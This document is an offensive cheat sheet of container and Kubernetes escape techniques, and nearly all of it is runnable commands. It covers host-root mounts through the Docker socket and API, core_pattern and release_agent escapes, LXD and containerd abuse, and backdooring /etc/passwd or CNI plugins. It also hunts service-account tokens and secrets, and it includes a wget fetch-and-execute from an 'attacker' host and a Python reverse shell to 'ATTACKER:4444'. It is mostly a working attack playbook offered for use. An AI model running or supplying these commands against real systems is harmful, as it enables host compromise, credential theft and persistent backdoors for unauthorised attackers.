# Container & Namespace Escapes (Docker / containerd / runc / lxd / Kubernetes)

## Am I in a container?
```bash
cat /proc/self/cgroup 2>/dev/null | grep -iE 'docker|containerd|kubepods'
ls /.dockerenv 2>/dev/null
cat /proc/1/comm   # systemd vs container entrypoint
grep -a 'container=' /proc/1/environ
```

## Quick wins (check all)
```bash
ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null
mount | grep -E '/host|/rootfs'     # host bind mounts
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
id; capsh --print 2>/dev/null       # capabilities? SYS_ADMIN?
fdisk -l 2>/dev/null; ls /dev/sd* /dev/vd* 2>/dev/null   # block devices (privileged)
```

## 1. Docker socket (`/var/run/docker.sock`)
```bash
# with docker CLI:
docker -H unix:///var/run/docker.sock run -v /:/host -it --rm alpine chroot /host sh
docker -H unix:///var/run/docker.sock run --rm -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
# without CLI (raw API):
curl --unix-socket /var/run/docker.sock http://localhost/images/json
HELPER=x; curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=$HELPER"
curl --unix-socket /var/run/docker.sock -X POST "http://localhost/v1.47/containers/$HELPER/start"
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","id"]}' \
  "http://localhost/v1.47/containers/$HELPER/exec" | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' "http://localhost/v1.47/exec/$EXEC_ID/start"
# TCP API (2375): docker -H tcp://IP:2375 run -v /:/mnt ...
```

## 2. `--privileged` / high caps
```bash
mount /dev/sda1 /mnt && chroot /mnt sh           # host disk
# core_pattern escape (writable /proc/sys/kernel/core_pattern):
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
printf '#!/bin/sh\ncp /bin/sh /tmp/rootsh && chmod u+s /tmp/rootsh\n' > /shell.sh && chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
gcc -o /tmp/crash /tmp/crash.c && /tmp/crash     # segfault triggers script ON THE HOST
# also: /proc/sys/kernel/modprobe, binfmt_misc register, /sys/kernel/uevent_helper
# cgroup v1 release_agent (needs SYS_ADMIN + unconfined seccomp):
unshare -UrmC sh -c 'mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
 echo 1 > /tmp/c/notify_on_release; echo /proc/self/exe > /tmp/c/release_agent;
 (sleep 1; echo 0 > /tmp/c/cgroup.procs) & while true; do sleep 1; done'
```

## 3. docker group
```bash
docker run -v /:/mnt --rm -it <image> chroot /mnt bash
# or backdoor host /etc/passwd via the mount
```

## 4. lxd/lxc group
```bash
# build alpine image (distrobuilder or lxd-alpine-builder), then:
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine pwn -c security.privileged=true
lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true
lxc start pwn; lxc exec pwn /bin/sh    # /mnt/root = host /
```

## 5. containerd (`ctr`) / runc
```bash
ctr image list
ctr run --mount type=bind,src=/,dst=/,options=rbind -t <image> name bash
ctr run --privileged --net-host -t <image> name bash
# runc: runc spec → edit config.json mounts {source:"/",destination:"/"} → runc run demo
```

## 6. Kubernetes specifics
```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/   # token
TOKEN=$(cat .../token); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
kubectl auth can-i --list 2>/dev/null
# kubelet API 10250 on node (--network=host): curl -k https://127.0.0.1:10250/pods, /runningpods/
# hostPath mounts, privileged pods, writable /opt/cni/bin (backdoor CNI plugin → code on next pod)
# kubelet pki/tokens under /var/lib/kubelet on node mounts
```

## 7. Network namespace pivot
```bash
# --network=host or host netns: enumerate localhost-only services
ss -lntup; curl http://127.0.0.1:2375/version; curl -k https://127.0.0.1:10250/pods
# cloud metadata: curl http://169.254.169.254/latest/meta-data/
# istio/envoy admin: curl http://127.0.0.1:15000/config_dump
```

## 8. Restricted environments (noexec / read-only / distroless)
- scripts are usually still executable (shebang interpreter): `sh /tmp/x.sh`, python/node/perl one-liners
- **DDexec / EverythingExec**: write binary via /proc/self/fd + execve syscall replacement (no exec perms):
  `wget -O- http://attacker/binary.elf | base64 -w0 | bash ddexec.sh argv0`
- distroless reverse shells without /bin/sh:
  ```python
  python3 - <<'PY'
  import os,pty,socket
  s=socket.create_connection(("ATTACKER",4444))
  for fd in (0,1,2): os.dup2(s.fileno(),fd)
  pty.spawn("/bin/sh")
  PY
  ```
  or node/net eval loop; look for busybox/openssl/curl already in image.

## 9. PID namespace / host PID tricks
- `--pid=host`: `nsenter -t 1 -m -u -n -i -p /bin/bash` (needs SYS_ADMIN), read /proc/<hostpid>/root/...
- host IPC (`--ipc=host`): `ipcs -a`, read /dev/shm secrets.

## 10. Capabilities cheatsheet (in container)
- CAP_SYS_ADMIN → mounts, cgroup release_agent, core_pattern
- CAP_SYS_MODULE → insmod host module (if modules dir shared)
- CAP_SYS_PTRACE → ptrace host processes
- CAP_NET_ADMIN → iptables/tc on host netns, MITM
- CAP_DAC_READ_SEARCH → read host files via open_by_handle_at (shocker exploit)
- check: `amicontained`, `capsh --print`

## K8s secrets hunting from pod
```bash
env | grep -iE 'secret|token|pass|key'
find /var/run/secrets -type f 2>/dev/null
kubectl get secrets -A; kubectl get secret <name> -o jsonpath='{.data}' | base64 -d
```
